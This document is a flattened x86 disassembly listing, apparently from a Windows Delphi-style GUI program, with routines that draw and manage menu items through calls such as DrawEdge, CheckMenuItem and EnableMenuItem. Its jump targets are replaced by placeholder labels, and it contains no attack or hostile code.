mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45b127
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_424028
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457198
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247f4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4242f4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424fb8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424ce0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457488
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424fb8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424aec
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_424028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403154
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b5eb
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_459248
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_424e18
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45a184
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45b738
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45c11c
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45b768
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45b7b4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45b996
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403350
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45b768
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45c11c
mov esi eax
mov eax edi
call sub_45b738
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b5c
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403fe8
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_459248
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40425c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b99d
lea eax [ ebp - 0x24 ]
call sub_403f50
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45a184
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45b9c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_40435c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fa4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45b9f0
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45bb60
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45bb70
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45ba38
sub_45ba38
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45a0f4
push eax
call CheckMenuItem
mov eax esi
call sub_45b9f0
sub_45ba8c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45bb60
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45a0f4
push eax
call EnableMenuItem
sub_45bb04
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45bec4
mov edx eax
mov ecx ebx
mov eax edi
call sub_45a094
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45b9f0
sub_45bb70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4185b0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45919c
sub_45bbe0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45bb60
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45bbc8
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45bef8
mov ecx ebx
mov edx esi
mov eax edi
call sub_45bcec
sub_45bc28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45bb60
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45bb70
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45bc80
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45bb60
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45bb70
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45bb70
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45bcec
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45919c
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45a094
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41862c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45bf64
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45bb60
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459fc4
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4185b0
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4185b0
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45bb04
sub_45bda0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45919c
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45bb60
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459fc4
mov eax ebx
call sub_45bb60
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4185b0
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4184a0
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45be14
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45ba38
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45bb48
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45bb48
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45bedc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45bb60
mov edx eax
mov ecx esi
mov eax ebx
call sub_45bcec
pop esi
pop ebx
retn
sub_45bef8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45bec4
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45bda0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45919c
sub_45bf20
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45bf64
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45bf64
jmp r-xdata
mov eax ebx
call sub_459fc4
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45dc3c
sub_45bfbc
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebx + 0x4c ] eax
sub_45bfe4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403154
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c278
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403350
mov edx ebx
mov eax edi
call sub_42109c
mov eax ebx
mov si 0xffee
call sub_403350
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45c054
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ esi + 0x4c ] eax
sub_45c088
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45bb60
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45bb70
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45c0c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45bef8
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45bedc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45bedc
sub_45c12c
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45b9f0
sub_45c158
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45b9c8
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45ba38
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45ba8c
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403fa4
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45bbb8
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45bb04
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45bb94
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45bba8
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45c278
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45bb48
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403350
sub_45c29c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c2bc
push ebx
push esi
